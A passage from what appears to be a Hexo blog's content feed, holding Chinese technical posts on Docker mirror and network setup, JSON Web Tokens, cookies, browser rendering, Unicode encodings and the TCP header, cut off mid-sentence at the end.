class="line">nameserver 182.254.116.116</span><br></pre></td></tr></table></figure><h3 id="配置镜像加速器"><a href="#配置镜像加速器" class="headerlink" title="配置镜像加速器"></a>配置镜像加速器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p &#x2F;etc&#x2F;docker</span><br><span class="line">tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;hvmf8r55.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br><span class="line">查看 daemon.json 是否已经生效了</span><br><span class="line">tail &#x2F;etc&#x2F;docker&#x2F;daemon.json</span><br></pre></td></tr></table></figure><h3 id="网络恢复"><a href="#网络恢复" class="headerlink" title="网络恢复"></a>网络恢复</h3><p>虚拟机一旦重启，或者关机过，那么就会出现可以访问 Linux，但是无法访问里面的 Docker的情况。可以在 CentOS里做如下事情：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">或者</span><br><span class="line">vi &#x2F;usr&#x2F;lib&#x2F;sysctl.d&#x2F;00-system.conf</span><br><span class="line">添加如下代码：</span><br><span class="line">net.ipv4.ip_forward&#x3D;1</span><br><span class="line">重启network服务</span><br><span class="line">systemctl restart network</span><br><span class="line">查看是否修改成功</span><br><span class="line">sysctl net.ipv4.ip_forward</span><br><span class="line">如果返回为“net.ipv4.ip_forward &#x3D; 1”则表示成功了</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Json Web Token</title>
      <link href="/2019/07/07/Json-Web-Token/"/>
      <url>/2019/07/07/Json-Web-Token/</url>
      
        <content type="html"><![CDATA[<blockquote><p>JWT—Json Web Token，是一种用于通信双方之间传递安全信息的简洁的，URL安全的表述性声明规范，经常用在跨域身份验证。<br>JWT以JSON对象的形式安全传递信息。因为存在数字签名，因此所传递的信息是安全的。</p></blockquote><h4 id="一、跨域认证的问题"><a href="#一、跨域认证的问题" class="headerlink" title="一、跨域认证的问题"></a>一、跨域认证的问题</h4><p>互联网服务离不开用户认证。一般流程是下面这样。</p><ol><li>用户向服务器发送用户名和密码。</li><li>服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</li><li>服务器向用户返回一个 session_id，写入用户的 Cookie。</li><li>用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</li><li>服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</li></ol><p>这种模式的问题在于，扩展性（scaling）不好。单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。<br>一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。<br>另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。</p><h4 id="二、JWT-的原理"><a href="#二、JWT-的原理" class="headerlink" title="二、JWT 的原理"></a>二、JWT 的原理</h4><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。<br>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p><h4 id="三、JWT-的几个特点"><a href="#三、JWT-的几个特点" class="headerlink" title="三、JWT 的几个特点"></a>三、JWT 的几个特点</h4><p>（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。<br>（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。<br>（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。<br>（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。<br>（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。<br>（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</p><h4 id="四、JWT-的使用方式"><a href="#四、JWT-的使用方式" class="headerlink" title="四、JWT 的使用方式"></a>四、JWT 的使用方式</h4><p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。<br>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><p>另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。</p><h4 id="五、JWT-的数据结构"><a href="#五、JWT-的数据结构" class="headerlink" title="五、JWT 的数据结构"></a>五、JWT 的数据结构</h4><p>实际的 JWT 大概就像下面这样。<br><img src="JWT1.png" alt=""><br>它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。</p><p>JWT 的三个部分依次如下。</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）<br>写成一行，就是下面的样子。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure></li></ul><h5 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h5><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。<br>最后，将上面的 JSON 对象使用 Base64URL 算法转成字符串。</p><h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss (issuer)：签发人</span><br><span class="line">exp (expiration time)：过期时间</span><br><span class="line">sub (subject)：主题</span><br><span class="line">aud (audience)：受众</span><br><span class="line">nbf (Not Before)：生效时间</span><br><span class="line">iat (Issued At)：签发时间</span><br><span class="line">jti (JWT ID)：编号</span><br></pre></td></tr></table></figure><p>除了官方字段，还可以在这个部分定义私有字段，下面就是一个例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。<br>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p><h5 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h5><p>Signature 部分是对前两部分的签名，防止数据篡改。</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p><h5 id="Base64URL"><a href="#Base64URL" class="headerlink" title="Base64URL"></a>Base64URL</h5><p>前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p><p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。</p>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Session </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie</title>
      <link href="/2019/07/05/Cookie/"/>
      <url>/2019/07/05/Cookie/</url>
      
        <content type="html"><![CDATA[<h4 id="Cookie-是什么"><a href="#Cookie-是什么" class="headerlink" title="Cookie 是什么"></a>Cookie 是什么</h4><ol><li>Cookie 是浏览器访问服务器后，服务器传给浏览器的一段数据。</li><li>浏览器需要保存这段数据，不得轻易删除。</li><li>此后每次浏览器访问该服务器，都必须带上这段数据。</li></ol><h4 id="使用-Cookie"><a href="#使用-Cookie" class="headerlink" title="使用 Cookie"></a>使用 Cookie</h4><p>Cookie 一般有两个作用</p><h6 id="第一个作用是识别用户身份"><a href="#第一个作用是识别用户身份" class="headerlink" title="第一个作用是识别用户身份"></a>第一个作用是识别用户身份</h6><p>比如用户 A 用浏览器访问了 <a href="http://a.com，那么" target="_blank" rel="noopener">http://a.com，那么</a> <a href="http://a.com" target="_blank" rel="noopener">http://a.com</a> 的服务器就会立刻给 A 返回一段数据「uid=1」（这就是 Cookie）。当 A 再次访问 <a href="http://a.com" target="_blank" rel="noopener">http://a.com</a> 的其他页面时，就会附带上「uid=1」这段数据。</p><p>同理，用户 B 用浏览器访问 <a href="http://a.com" target="_blank" rel="noopener">http://a.com</a> 时，<a href="http://a.com" target="_blank" rel="noopener">http://a.com</a> 发现 B 没有附带 uid 数据，就给 B 分配了一个新的 uid，为2，然后返回给 B 一段数据「uid=2」。B 之后访问 <a href="http://a.com" target="_blank" rel="noopener">http://a.com</a> 的时候，就会一直带上「uid=2」这段数据。</p><p>借此，<a href="http://a.com" target="_blank" rel="noopener">http://a.com</a> 的服务器就能区分 A 和 B 两个用户了。</p><h6 id="第二个作用是记录历史"><a href="#第二个作用是记录历史" class="headerlink" title="第二个作用是记录历史"></a>第二个作用是记录历史</h6><p>假设 <a href="http://a.com" target="_blank" rel="noopener">http://a.com</a> 是一个购物网站，当 A 在上面将商品 A1 、A2 加入购物车时，JS 可以改写 Cookie，改为「uid=1; cart=A1,A2」，表示购物车里有 A1 和 A2 两样商品了。</p><p>这样一来，当用户关闭网页，过三天再打开网页的时候，依然可以看到 A1、A2 躺在购物车里，因为浏览器并不会无缘无故地删除这个 Cookie。</p><p>借此，就达到里记录用户操作历史的目的了。</p>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cookie </tag>
            
            <tag> Session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How The Browser Works</title>
      <link href="/2019/07/03/How-The-Browser-Works/"/>
      <url>/2019/07/03/How-The-Browser-Works/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="http://taligarsiel.com/Projects/howbrowserswork1.htm" target="_blank" rel="noopener">参考教程</a></p></blockquote><p><img src="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%861.png" alt=""></p><h2 id="主要流程"><a href="#主要流程" class="headerlink" title="主要流程"></a>主要流程</h2><p>1、DNS 解析<br>2、TCP 连接<br>3、HTTP 请求<br>4、构建 DOM 树<br>5、构建 CSSOM 树<br>6、生成渲染树<br>7、合成、绘制<br><img src="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%862.png" alt=""></p><h3 id="DNS-解析"><a href="#DNS-解析" class="headerlink" title="DNS 解析"></a>DNS 解析</h3><blockquote><p>所谓的 DNS 解析就是将我们输入在网页地址栏的 URL 通过 DNS 解析成 IP 地址。DNS 就是将域名转化成 ip 地址的过程。</p></blockquote><p><img src="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%863.png" alt=""></p><h4 id="系统缓存查询"><a href="#系统缓存查询" class="headerlink" title="系统缓存查询"></a>系统缓存查询</h4><p>首先浏览器会调用一个库函数，检测本地的 hosts 文件（可以认为是电脑本地的一个地址映射文件），从该文件中查看是否有对应的该域名的 IP 地址，这个过程是在系统缓存中查找是否存在该域名对应的 IP 地址。</p><h4 id="路由器缓存、ISP-缓存"><a href="#路由器缓存、ISP-缓存" class="headerlink" title="路由器缓存、ISP 缓存"></a>路由器缓存、ISP 缓存</h4><p>如果系统缓存没有，就会向 DNS 服务器发送请求，而网络服务一般都会先经过路由器以及网络服务商（电信），所以会先查询路由器缓存，然后再查询 ISP 的 DNS 缓存。</p><blockquote><p>ISP缓存，本身是一种宽带接入提供商给网页批量访问加速的技术。ISP会将当前访问量较大的网页内容放到ISP服务器的缓存中，当有新的用户请求相同内容时，可以直接从缓存中发送相关信息，不必每次都去访问真正的网站，从而加快了不同用户对相同内容的访问速度，同时也能节省网间流量结算成本。</p></blockquote><h4 id="DNS-递归查询"><a href="#DNS-递归查询" class="headerlink" title="DNS 递归查询"></a>DNS 递归查询</h4><p>如果路由器缓存和 ISP 的 DNS 缓存还是没有的话，我们就进行 DNS 递归查询。从根域名服务器开始查询，然后再到顶级域名服务器，最后到主域名服务器依次查询。<br>但是这里有两种查询方式，不仅仅有递归查询一种方式，还有一个查询方式是迭代查询，两种查询方式的区别是什么呢？</p><blockquote><p>迭代查询：DNS 收到请求时，而不是直接返回查询结果，而是告诉客户端另一台 DNS 服务器地址。然后客户端再向这台的 DNS 服务器提交请求，依次循环。</p></blockquote><p><img src="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%864.png" alt=""></p><blockquote><p>递归查询：当 DNS 服务器收到请求时，就会检查 DNS 缓存，如果没有就会询问其他服务器，并将返回的查询结果返回客户端。</p></blockquote><p><img src="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%865.png" alt=""></p><p>DNS 查询经历很多步骤，查询很慢。浏览器获取到 IP 地址后，一般都会加到浏览器的缓存中，本地的 DNS 缓存服务器，也可以去记录。<br>另外使用 DNS 负载均衡，通常我们的网站应用各种云服务，DNS 系统根据每台机器的负载量，地理位置的限制等等，去提供高效快速的 DNS 解析服务。</p><h3 id="TCP-链接"><a href="#TCP-链接" class="headerlink" title="TCP 链接"></a>TCP 链接</h3><p>见《网络分层模型》<br>见《TCP三次握手与四次挥手》</p><h3 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h3><p>客户端与服务端通过 TCP 的三次握手建立连接之后，客户端开始向服务器主动发起请求。<br>服务端接收到客户端发送的信息，就返回响应信息和文件。客户端如何判断服务端是否成功返回了呢？就需要下列的一些状态码来识别，同样前端做的工作也是通过状态码来判断当前响应状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1XX（信息性状态码） : 服务器正在处理请求中。</span><br><span class="line"></span><br><span class="line">2XX （成功状态码）: 请求处理完毕。</span><br><span class="line"></span><br><span class="line">3XX （重定向状态码）: 需要附加操作以完成请求。</span><br><span class="line"></span><br><span class="line">301：永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后使用该资源，使用现在所指 URI。</span><br><span class="line"></span><br><span class="line">302：临时性重定向。表示该状态码被分配了新的 URI，希望用户本次能够使用新的 URI 访问。</span><br><span class="line"></span><br><span class="line">304：服务器资源未改变，可直接使用客户端未过期的缓存。</span><br><span class="line"></span><br><span class="line">4XX （客户端错误状态码）: 服务器无法处理请求。</span><br><span class="line"></span><br><span class="line">400：该请求报文中有语法错误。</span><br><span class="line"></span><br><span class="line">403：没有资源的访问权限。</span><br><span class="line"></span><br><span class="line">404：找不到资源。</span><br><span class="line"></span><br><span class="line">5XX （服务端错误状态码）: 服务器处理请求出错。</span><br><span class="line"></span><br><span class="line">500：服务器发生错误</span><br><span class="line"></span><br><span class="line">503：服务器超荷载或正在维护。</span><br></pre></td></tr></table></figure><p>远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。</p><h3 id="浏览器的渲染原理"><a href="#浏览器的渲染原理" class="headerlink" title="浏览器的渲染原理"></a>浏览器的渲染原理</h3><h4 id="构建-DOM"><a href="#构建-DOM" class="headerlink" title="构建 DOM"></a>构建 DOM</h4><p>服务器将 HTML、CSS、JS文件转化为 0,1字节数据在网络中传输给浏览器，浏览器通过判断状态码开始接收、解析文件，这开始运用到浏览器的渲染原理。</p><p>首先浏览器要做的就是获取 HTTP 的 Request 的 body 中字符串（字符流）的 HTML 文本，进行解析并构建 DOM 树。</p><p>将字符流转化为字符串之后，浏览器开始进行词法分析，虽然这个名词我们不熟悉，但是我们要知道，一个 HTML 字符串我们要拆分开才能构建 DOM 树，词法分析就是将字符串拆分成的过程。将字符串转化为的 token（标记） —— token 作为代码的最小单位，也就是拆分后的结果，这个过程我们称为标记化。</p><p><img src="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%866.png" alt=""></p><p>将字符串拆解之后，然后将这些标记转化为 Node 结点，浏览器根据不同的结点开始构建一棵 DOM 树。这就是整个 DOM 树构建的过程，其中还涉及到很多的细节，比如词法分析是如何一个过程（状态机），有兴趣的小伙伴可以详细查看英文文档，在文章底部。</p><p><img src="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%867.png" alt=""></p><h4 id="构建-CSSOM-树"><a href="#构建-CSSOM-树" class="headerlink" title="构建 CSSOM 树"></a>构建 CSSOM 树</h4><p>浏览器已经把 HTML 文件转化为了 DOM 树，下面就对 CSS 样式文件进行解析，构建成 CSSOM 树。这个过程和上述构建 DOM 树的过程有点相似，但是其中 CSSOM 树的构建更加的耗时。下面我们来看看如何耗时的？</p><p>浏览器通过递归的方式 DOM 树为结点设置样式。通过先找到具体的标签，然后递归找到设置的上级标签，最后确定选择器选择的所选标签的样式。</p><p>我们在写代码的时候可以做出优化，所以应该避免书写过于具体的 CSS 选择器，少一些添加无意义的 HTML 标签，有利于提高习页面的性能。</p><h4 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h4><p>我们分别将上边生成的 DOM 和 CSSOM 树进行合并，生成我们的渲染树。但是在合并的时候，并不是两者简单的进行结合，因为有些结点我们并不需要显示，还记得有一个 display:none 属性吗？如果某结点的样式有这个属性，就不会出现在渲染树中。</p><h4 id="合成、绘制"><a href="#合成、绘制" class="headerlink" title="合成、绘制"></a>合成、绘制</h4><p>浏览器在生成渲染树的时候，就会根据渲染树进行布局，调用 GPU 进行绘制，然后合成图层，最后显示在屏幕上。</p>]]></content>
      
      
      <categories>
          
          <category> Internet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Browser </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unicode Introduction</title>
      <link href="/2019/06/01/Unicode-Introduction/"/>
      <url>/2019/06/01/Unicode-Introduction/</url>
      
        <content type="html"><![CDATA[<h4 id="Unicode标准支持什么字符？"><a href="#Unicode标准支持什么字符？" class="headerlink" title="Unicode标准支持什么字符？"></a>Unicode标准支持什么字符？</h4><p>Unicode标准定义了今日所有主流的书写语言中用到的字符。Unicode支持的书写体系包括欧洲的语系、中东的从右至左书写的语系，以及亚洲的多种语系。<br>Unicode标准还包含了标点符号、声调符号、数学符号、科技符号、箭头、各种图形符号、表情符号，等等。Unicode为声调符号（用来改变其他字符的符号，如波浪线~）单独提供了代码，这些代码可以与基础字符组合使用，来表示有声调的字符（如ñ）。Unicode标准9.0版总共提供了128,172个字符的代码，其中包括了全世界的字符、图形和符号。<br>绝大部分的常用字符都能映射到最前面的64K个代码点上，这一区域叫做基本多文种平面（basic multilingual plane，简称为BMP）。还有十六个补充平面用来编码其他字符，目前尚有850,000个未使用的代码点。人们还在考虑在以后的版本中添加更多的字符。<br>Unicode标准还保留了一些代码点供私人使用。供应商或最终用户可以在内部利用这些代码点表示他们自己的字符和符号，或者通过特殊的字体来使用。BMP上有6,400个私有代码点，如果不够的话，补充平面上还有131,068个私有代码点可供使用。</p><h4 id="Unicode字符编码"><a href="#Unicode字符编码" class="headerlink" title="Unicode字符编码"></a>Unicode字符编码</h4><p>字符编码标准不仅定义了每个字符的唯一标识（即字符的数字值，或者叫做代码点），也定义了怎样用比特来表示这个值。<br>Unicode标准定义了三种编码形式，允许同一个数据以一字节、两字节或四字节的格式来传输（即每个代码单元可以是8比特、16比特或32比特）。同一个字符集可以使用所有三种编码形式，它们之间可以互相转换，而不会丢失数据。Unicode联盟建议根据实际需要，选择任何一种方便的编码方式来实现Unicode标准。<br>UTF-8在HTML和类似协议上非常常用。UTF-8使用变长编码。它的优点是，对应于ASCII字符集的那些Unicode字符的字节值与它们在ASCII中的值完全相同，因此使用UTF-8编码的Unicode字符可以在绝大多数已有软件上使用，无需对软件做出任何修改。<br>UTF-16在许多需要平衡性能和存储效率的环境中非常常用。它足够紧凑，所有常用的字符都可以用一个16比特的代码单元来表示，其他字符可以使用一对16比特代码单元来表示。<br>UTF-32在无需顾虑内存空间的情况下使用，它是定长编码，每个字符只有一个代码单元。每个Unicode字符编码成一个32比特代码单元。<br>在所有三种编码中，每个字符最多需要4个字节（32比特）表示。</p><h4 id="数字问题"><a href="#数字问题" class="headerlink" title="数字问题"></a>数字问题</h4><p>Unicode字符集被分成17个核心段，称为“平面”，每个平面又被分成若干区块。每个平面的空间足够容纳65,536（216）个代码点，因此总共有1,114,112个代码点。还有两个“私有区域”平面（#16和#17），可以按照使用者的意愿定义。这两个私有平面共包含131,072个代码点。<br><img src="Unicode_1.png" alt=""><br>第一个平面叫做“基本多文种平面”，或者称为BMP。它包含代码点U+0000到U+FFFF，这个范围内包含了绝大部分常用字符。另外16个平面（U+010000到U+10FFFF）称为补充平面。</p><h4 id="UTF-16代理对"><a href="#UTF-16代理对" class="headerlink" title="UTF-16代理对"></a>UTF-16代理对</h4><blockquote><p>“BMP之外的字符，例如U+1D306 tetragram for centre (𝌆)，在UTF-16编码中只能编码成两个16比特代码单元：0xD834 0xDF06。这种情况称为代理对（surrogate pair）。注意代理对只表示一个字符。</p></blockquote><blockquote><p>“代理对的第一个字符永远在0xD800到0xDBFF的范围内，称为高位代理，或者叫起始字节代理。代理对的第二个代码单元永远在0xDC00到0xDFFF的范围内，称为低位代理，或者叫末端代理。代理对仅在UTF-16中使用。”</p></blockquote><h4 id="组合和解组合"><a href="#组合和解组合" class="headerlink" title="组合和解组合"></a>组合和解组合</h4><p>Unicode包括了一种修改字符形状的机制，大幅扩展了Unicode支持的字符量。使用声调符号进行组合就是其中一种方式。声调符号写在主字符的后面。多个声调符号可以叠在同一个字符上。对于绝大部分常用的字母声调组合，Unicode还包括了预先组合好的版本。<br>特定的字符序列也可以用单个字符表示，称为“预组合字符”（或者叫组合字符，可以解组合的字符）。例如，字符“ü”可以编码成单个代码单元U+00FC “ü”，也可以编码成基本字符U+0075 “u”后接无空白字符U+0308 “¨”。Unicode标准中设置的预组合字符是为了兼容Latin 1等标准，后者包含了许多预组合字符，如“ü”和“ñ”。<br>预组合字符可以进行接组合，以保持一致性，或用于分析。例如，需要将一组名称转换为英文字母时，可以将字符“ü”解组合为“u”后接非空白字符“¨”。解组合后的结果很容易处理，因为该组合字符可以处理成“u”后接一个修饰字符。这样很容易进行按字母顺序排序等，因为修饰字符不会影响字母顺序。Unicode标准为所有预组合字符定义了解组合方式（<a href="https://unicode.org/versions/Unicode8.0.0/ch03.pdf#page=44）。它还定义了正规化的方式，以便为字符提供唯一的表示方法。" target="_blank" rel="noopener">https://unicode.org/versions/Unicode8.0.0/ch03.pdf#page=44）。它还定义了正规化的方式，以便为字符提供唯一的表示方法。</a></p><h4 id="Unicode之谜"><a href="#Unicode之谜" class="headerlink" title="Unicode之谜"></a>Unicode之谜</h4><p>来自Mark Davis的《Unicode之谜》幻灯片（<a href="https://macchiato.com/slides/UnicodeMyths.pdf）。" target="_blank" rel="noopener">https://macchiato.com/slides/UnicodeMyths.pdf）。</a><br>Unicode只不过是16比特编码。一些人误认为Unicode只不过是16比特编码，每个字符占用16比特，因此一共有65,536个可能的字符。实际上这是不正确的。这样是关于Unicode的最大误解，所以也难怪一些人会这么想。</p><p>任何未分配的代码点都可以用于内部用途？错。最终，那些未分配的地方都会被某个字符使用。你应该使用私有用途代码点，或非字符代码点。</p><p>每个Unicode代码点都表示一个字符？错。有许多非字符代码点（FFFE，FFFF，1FFFE，……）还有许多代理代码点、私有代码点和未分配的代码点，还有控制和格式“字符（RLM，ZWNJ，……）</p><p>字符映射是一对一的？错。映射关系也可能是：</p><p>一对多：(ß → SS )</p><p>上下文相关：(…Σ ↔ …ς 和 …ΣΤ… ↔ …στ… )</p><p>语言相关：( I ↔ ı 和 İ ↔ i )</p>]]></content>
      
      
      <categories>
          
          <category> Encoding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unicode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP</title>
      <link href="/2019/05/23/TCP/"/>
      <url>/2019/05/23/TCP/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><blockquote><p>TCP（Transmission Control Protocol 传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。<br>通俗一点的讲，TCP 就是一个双方通信的一个规范标准（协议）。</p></blockquote><h3 id="TCP-头部报文"><a href="#TCP-头部报文" class="headerlink" title="TCP 头部报文"></a>TCP 头部报文</h3><p><img src="TCP1.png" alt=""></p><h4 id="source-port-和-distination-port"><a href="#source-port-和-distination-port" class="headerlink" title="source port 和 distination port"></a>source port 和 distination port</h4><blockquote><p>两者分别为「源端口号」和「目的端口号」</p></blockquote><p>一个数据包（pocket）被解封装成数据段（segment）后就会涉及到连接上层协议的端口问题。</p><p>扩展：应用程序的端口号和应用程序所在主机的 IP 地址统称为 socket（套接字），IP:端口号, 在互联网上 socket 唯一标识每一个应用程序，源端口+源IP+目的端口+目的IP称为”套接字对“，一对套接字就是一个连接，一个客户端与服务器之间的连接。</p><h4 id="Sequence-Number"><a href="#Sequence-Number" class="headerlink" title="Sequence Number"></a>Sequence Number</h4><p>称为「序列号」。用于 TCP 通信过程中某一传输方向上字节流的每个字节的编号，为了确保数据通信的有序性，避免网络中乱序的问题。接收端根据这个编号进行确认，保证分割的数据段在原始数据包的位置。</p><p>PS：初始序列号由自己定，而后绪的序列号由对端的 ACK 决定：SN_x = ACK_y (x 的序列号 = y 发给 x 的 